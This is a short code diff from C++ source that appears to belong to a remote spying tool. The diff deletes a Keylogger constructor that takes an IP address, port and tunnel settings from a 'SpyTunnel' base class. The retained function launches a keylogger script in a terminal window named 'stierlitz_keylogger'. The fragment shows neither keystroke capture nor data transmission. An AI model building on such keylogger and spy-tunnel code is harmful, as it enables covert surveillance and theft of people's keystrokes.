@@ -1,16 +1,5 @@
 #include "keylogger.hpp"
 
-Keylogger::Keylogger(
-    std::string* __p_ip, 
-        uint* __p_port,
-        int __client_index,
-        std::atomic<bool>* __p_shutdown_flag,
-        int __connection_type,
-        int __shutdown_event_fd,
-        std::vector<int>* __p_tunnel_shutdown_fds
-    ) : SpyTunnel(__p_ip, __p_port, __client_index, __p_shutdown_flag, __connection_type, __shutdown_event_fd, p_tunnel_shutdown_fds_) {
-}
-
 void Keylogger::spawn_window() {
     execlp("urxvt", "urxvt", "-name", "stierlitz_keylogger", "-e", KEYLOGGER_SCRIPT_PATH, (char*)NULL);
 }
